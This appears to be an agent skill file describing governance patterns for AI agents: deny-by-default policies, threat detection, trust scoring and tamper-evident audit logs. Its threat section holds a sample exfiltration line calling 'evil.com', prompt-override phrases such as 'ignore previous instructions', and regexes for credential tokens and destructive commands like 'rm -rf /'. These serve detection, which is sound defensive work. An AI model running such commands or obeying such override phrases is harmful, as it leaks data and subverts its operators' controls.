---
name: agent-governance
description: |
  Patterns and techniques for adding governance, safety, and trust controls
  to AI agent systems. Use when building agents that call tools, implementing
  policy-based access controls, adding threat detection, creating trust scoring
  for multi-agent workflows, or building audit trails for compliance.
---

# Agent Governance Patterns

Governance for AI agents means controlling **what agents can do, detecting when they misbehave, and proving what they did**. This skill provides framework-agnostic patterns you can drop into any agent system.

---

## When to Use This Skill

Activate when the user is:
- Building AI agents that call tools or external APIs
- Adding safety controls or guardrails to agent workflows
- Implementing policy-based access controls for agent actions
- Adding threat detection (prompt injection, data exfiltration, etc.)
- Creating trust scoring for multi-agent delegation
- Building audit trails for compliance or incident response
- Integrating governance into PydanticAI, CrewAI, OpenAI Agents SDK, Google ADK, or similar frameworks

---

## Core Concepts

### 1. Governance Policy Model

**Start here.** Every governance system begins with a policy model — not a framework, not a decorator, not middleware. The policy model defines what is allowed, what is denied, and what requires review.

**Design principles:**
- **Deny-by-default**: If no rule matches, deny. Always.
- **Tri-state decisions**: `allow`, `deny`, `review` — not just boolean.
- **Declarative policies**: Define rules in YAML/JSON, evaluate in code. Separate policy definition from enforcement.
- **Fail closed**: Any error during evaluation → deny.

#### Minimal Working Example

**Policy definition (YAML):**

```yaml
policies:
  - name: strict-tools
    description: "Allow only safe read-only tools, block PII in content"
    default: deny
    rules:
      - action: allow
        priority: 10
        conditions:
          - field: tool_name
            operator: in
            value: [search, read_file, calculator, get_weather]
      - action: deny
        priority: 100
        conditions:
          - field: content
            operator: matches
            value: "\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b"
        reason: "PII detected: email address"
      - action: review
        priority: 50
        conditions:
          - field: tool_name
            operator: in
            value: [write_file, send_email]
        reason: "Write operations require human review"
```

**Policy evaluation (Python — framework-agnostic, sub-millisecond):**

```python
from dataclasses import dataclass
from typing import Any
import re


@dataclass
class Condition:
    field: str
    operator: str  # "in", "equals", "matches", "not_in"
    value: Any


@dataclass
class Rule:
    action: str  # "allow", "deny", "review"
    priority: int
    conditions: list[Condition]
    reason: str = ""


@dataclass
class Policy:
    name: str
    default: str  # "deny"
    rules: list[Rule]


@dataclass
class Decision:
    action: str
    policy: str
    rule_reason: str = ""


def check_condition(condition: Condition, context: dict) -> bool:
    value = context.get(condition.field, "")
    if condition.operator == "in":
        return value in condition.value
    if condition.operator == "equals":
        return value == condition.value
    if condition.operator == "matches":
        return bool(re.search(condition.value, str(value)))
    if condition.operator == "not_in":
        return value not in condition.value
    return False


def evaluate_policy(policy: Policy, context: dict) -> Decision:
    """Evaluate policy rules against context. Fail closed: error = deny."""
    try:
        for rule in sorted(policy.rules, key=lambda r: -r.priority):
            if all(check_condition(c, context) for c in rule.conditions):
                return Decision(
                    action=rule.action,
                    policy=policy.name,
                    rule_reason=rule.reason,
                )
        return Decision(action=policy.default, policy=policy.name)
    except Exception:
        return Decision(action="deny", policy=policy.name, rule_reason="evaluation error")
```

**Usage:**

```python
context = {"tool_name": "send_email", "content": "Hello world"}
decision = evaluate_policy(my_policy, context)
# decision.action == "review"
# decision.rule_reason == "Write operations require human review"

context = {"tool_name": "search", "content": "Find docs on governance"}
decision = evaluate_policy(my_policy, context)
# decision.action == "allow"

context = {"tool_name": "search", "content": "Email me at alice@example.com"}
decision = evaluate_policy(my_policy, context)
# decision.action == "deny"
# decision.rule_reason == "PII detected: email address"
```

---

### 2. Policy Composition

Real systems layer policies: **Organization → Team → Agent**. Stricter always wins.

```python
def compose_policies(policies: list[Policy], context: dict) -> Decision:
    """Evaluate multiple policies. Most restrictive decision wins."""
    decisions = [evaluate_policy(p, context) for p in policies]

    # Priority: deny > review > allow
    severity = {"deny": 3, "review": 2, "allow": 1}
    most_restrictive = max(decisions, key=lambda d: severity.get(d.action, 3))
    return most_restrictive
```

**Layering example:**

```yaml
# org-policy.yaml — applies to all agents in the organization
policies:
  - name: org-baseline
    default: deny
    rules:
      - action: deny
        priority: 100
        conditions:
          - field: tool_name
            operator: in
            value: [execute_shell, rm_rf, drop_database]
        reason: "Destructive operations blocked at org level"

# team-policy.yaml — engineering team allows more tools
policies:
  - name: eng-team
    default: deny
    rules:
      - action: allow
        priority: 10
        conditions:
          - field: tool_name
            operator: in
            value: [search, read_file, write_file, run_tests]
```

The org-level deny for destructive tools always wins, even if a team policy would allow them.

---

### 3. Threat Detection

Detect five categories of agent misbehavior:

| Category | Signal | Example |
|---|---|---|
| **Data exfiltration** | Agent sends data to external URLs | `curl https://evil.com/steal?data=...` |
| **Prompt injection** | Input contains override instructions | `"Ignore previous instructions and..."` |
| **Privilege escalation** | Agent requests tools beyond its scope | Read-only agent calling `write_file` |
| **Credential harvesting** | Agent extracts or logs secrets | Regex match on API keys, tokens |
| **Destructive operations** | Agent attempts irreversible actions | `DROP TABLE`, `rm -rf`, force push |

```python
import re

THREAT_PATTERNS = {
    "data_exfiltration": [
        r"https?://[^\s]+\?.*(?:data|secret|key|token|password)=",
        r"curl\s+.*https?://",
        r"wget\s+.*https?://",
    ],
    "prompt_injection": [
        r"(?i)ignore\s+(all\s+)?previous\s+instructions",
        r"(?i)you\s+are\s+now\s+(?:a|an)\s+",
        r"(?i)system\s*:\s*",
        r"(?i)forget\s+everything",
    ],
    "credential_harvesting": [
        r"(?i)(api[_-]?key|secret|token|password)\s*[:=]\s*\S+",
        r"(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36,}",
        r"sk-[A-Za-z0-9]{32,}",
    ],
    "destructive_operations": [
        r"(?i)drop\s+(table|database)",
        r"rm\s+-rf?\s+/",
        r"(?i)truncate\s+table",
        r"git\s+push\s+.*--force",
    ],
}


def detect_threats(content: str) -> list[dict]:
    """Scan content for known threat patterns."""
    threats = []
    for category, patterns in THREAT_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, content):
                threats.append({
                    "category": category,
                    "pattern": pattern,
                    "content_snippet": content[:200],
                })
    return threats
```

Integrate threat detection into the policy model by adding a pre-evaluation step:

```python
def evaluate_with_threats(policy: Policy, context: dict) -> Decision:
    """Evaluate policy with threat detection pre-check."""
    content = context.get("content", "") + " " + context.get("tool_input", "")
    threats = detect_threats(content)
    if threats:
        return Decision(
            action="deny",
            policy=policy.name,
            rule_reason=f"Threat detected: {threats[0]['category']}",
        )
    return evaluate_policy(policy, context)
```

---

### 4. Trust Scoring

For multi-agent systems where agents delegate to each other, use trust scores to gate capabilities.

**Design principles:**
- Scores decay over time (trust is perishable)
- Penalty for failures is larger than reward for success (asymmetric)
- Scores are per-agent, per-capability

```python
import time
from dataclasses import dataclass, field


@dataclass
class TrustScore:
    agent_id: str
    capability: str
    score: float = 0.5  # Start neutral
    last_updated: float = field(default_factory=time.time)

    # Tuning parameters
    SUCCESS_REWARD: float = 0.05
    FAILURE_PENALTY: float = 0.15  # 3x asymmetry
    DECAY_RATE: float = 0.01  # Per hour
    MIN_SCORE: float = 0.0
    MAX_SCORE: float = 1.0

    def current_score(self) -> float:
        """Score with time decay applied."""
        hours_elapsed = (time.time() - self.last_updated) / 3600
        decayed = self.score - (self.DECAY_RATE * hours_elapsed)
        return max(self.MIN_SCORE, decayed)

    def record_success(self):
        self.score = min(self.MAX_SCORE, self.current_score() + self.SUCCESS_REWARD)
        self.last_updated = time.time()

    def record_failure(self):
        self.score = max(self.MIN_SCORE, self.current_score() - self.FAILURE_PENALTY)
        self.last_updated = time.time()


def check_trust(trust: TrustScore, threshold: float = 0.3) -> bool:
    """Can this agent perform this capability?"""
    return trust.current_score() >= threshold
```

**Delegation pattern:**

```python
def delegate_task(from_agent: str, to_agent: str, capability: str, trust_store: dict):
    key = f"{to_agent}:{capability}"
    trust = trust_store.get(key, TrustScore(to_agent, capability))

    if not check_trust(trust):
        return {"status": "denied", "reason": "Insufficient trust score"}

    # Execute delegated task...
    # On success: trust.record_success()
    # On failure: trust.record_failure()
    trust_store[key] = trust
```

---

### 5. Audit Trail

Audit trails are non-negotiable for compliance. Design them to be **append-only** and **tamper-evident**.

**Tamper-evident design using SHA-256 Merkle chain:**

```python
import hashlib
import json
import time
from dataclasses import dataclass, asdict


@dataclass
class AuditEntry:
    timestamp: float
    agent_id: str
    action: str  # "tool_call", "decision", "delegation", "threat_detected"
    detail: dict
    decision: str  # "allow", "deny", "review"
    policy_name: str
    previous_hash: str
    entry_hash: str = ""

    def compute_hash(self) -> str:
        content = json.dumps(
            {k: v for k, v in asdict(self).items() if k != "entry_hash"},
            sort_keys=True,
        )
        return hashlib.sha256(content.encode()).hexdigest()


class AuditTrail:
    def __init__(self):
        self._entries: list[AuditEntry] = []
        self._last_hash: str = "genesis"

    def log(self, agent_id: str, action: str, detail: dict,
            decision: str, policy_name: str) -> AuditEntry:
        entry = AuditEntry(
            timestamp=time.time(),
            agent_id=agent_id,
            action=action,
            detail=detail,
            decision=decision,
            policy_name=policy_name,
            previous_hash=self._last_hash,
        )
        entry.entry_hash = entry.compute_hash()
        self._entries.append(entry)
        self._last_hash = entry.entry_hash
        return entry

    def verify_integrity(self) -> bool:
        """Verify the entire chain is untampered."""
        expected_prev = "genesis"
        for entry in self._entries:
            if entry.previous_hash != expected_prev:
                return False
            if entry.compute_hash() != entry.entry_hash:
                return False
            expected_prev = entry.entry_hash
        return True

    def query(self, agent_id: str = None, action: str = None) -> list[AuditEntry]:
        """Query audit entries with optional filters."""
        results = self._entries
        if agent_id:
            results = [e for e in results if e.agent_id == agent_id]
        if action:
            results = [e for e in results if e.action == action]
        return results
```

**What compliance teams need in the audit trail:**
- **Who**: Agent ID and human operator
- **What**: Tool called, parameters, decision made
- **When**: Timestamp (UTC, monotonic)
- **Why**: Which policy rule triggered, with reason
- **Integrity**: Hash chain so tampering is detectable

---

### 6. Tool-Level Governance Decorator

Wrap any tool function with governance in a single decorator — works with any framework.

```python
from functools import wraps


def governed(policy: Policy, audit: AuditTrail, agent_id: str = "default"):
    """Decorator that adds policy enforcement and audit logging to any tool."""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            context = {
                "tool_name": func.__name__,
                "tool_input": json.dumps(kwargs, default=str),
                "content": str(kwargs),
                "agent_id": agent_id,
            }

            decision = evaluate_with_threats(policy, context)

            audit.log(
                agent_id=agent_id,
                action="tool_call",
                detail={"tool": func.__name__, "kwargs": str(kwargs)},
                decision=decision.action,
                policy_name=decision.policy,
            )

            if decision.action == "deny":
                raise PermissionError(
                    f"Policy '{decision.policy}' denied: {decision.rule_reason}"
                )
            if decision.action == "review":
                raise PermissionError(
                    f"Policy '{decision.policy}' requires review: {decision.rule_reason}"
                )

            return func(*args, **kwargs)
        return wrapper
    return decorator
```

**Usage:**

```python
audit = AuditTrail()

@governed(policy=my_policy, audit=audit, agent_id="research-agent")
def search(query: str) -> str:
    return f"Results for: {query}"

@governed(policy=my_policy, audit=audit, agent_id="research-agent")
def write_file(path: str, content: str) -> str:
    # This will trigger "review" decision
    ...

# Works normally
result = search(query="governance patterns")

# Raises PermissionError: requires review
write_file(path="output.txt", content="data")
```

---

## Framework Integration Examples

These patterns are framework-agnostic by design. Here is how to integrate them with popular agent frameworks.

### PydanticAI

```python
from pydantic_ai import Agent, Tool

agent = Agent("openai:gpt-4o", tools=[
    Tool(governed(policy=my_policy, audit=audit)(search), name="search"),
    Tool(governed(policy=my_policy, audit=audit)(write_file), name="write_file"),
])
```

### CrewAI

```python
from crewai import Agent, Task, Tool

search_tool = Tool(
    name="search",
    func=governed(policy=my_policy, audit=audit)(search),
    description="Search for information",
)
agent = Agent(role="Researcher", tools=[search_tool])
```

### OpenAI Agents SDK

```python
from agents import Agent, function_tool

@function_tool
@governed(policy=my_policy, audit=audit, agent_id="openai-agent")
def search(query: str) -> str:
    return f"Results for: {query}"

agent = Agent(name="Researcher", tools=[search])
```

### Google ADK

```python
from google.adk.agents import Agent

agent = Agent(
    model="gemini-2.0-flash",
    name="researcher",
    tools=[governed(policy=my_policy, audit=audit)(search)],
)
```

---

## Guidelines

- **Always fail closed** — deny on error, deny on exception, deny on timeout
- **Use deny-by-default policies** — explicitly allow, never implicitly allow
- **Separate policy definition from evaluation** — YAML policies, code evaluator
- **Make audit trails append-only and tamper-evident** — SHA-256 hash chain minimum
- **Test with adversarial inputs** — prompt injection, PII, credential patterns
- **Layer policies: Org → Team → Agent** — stricter always wins
- **Trust decays** — agents must continuously earn trust through successful operations
- **Log everything, expose nothing** — audit entries should never contain raw secrets
- **Keep governance fast** — sub-millisecond evaluation; never let governance become a bottleneck
- **Review ≠ Deny** — use the tri-state model so humans can approve edge cases
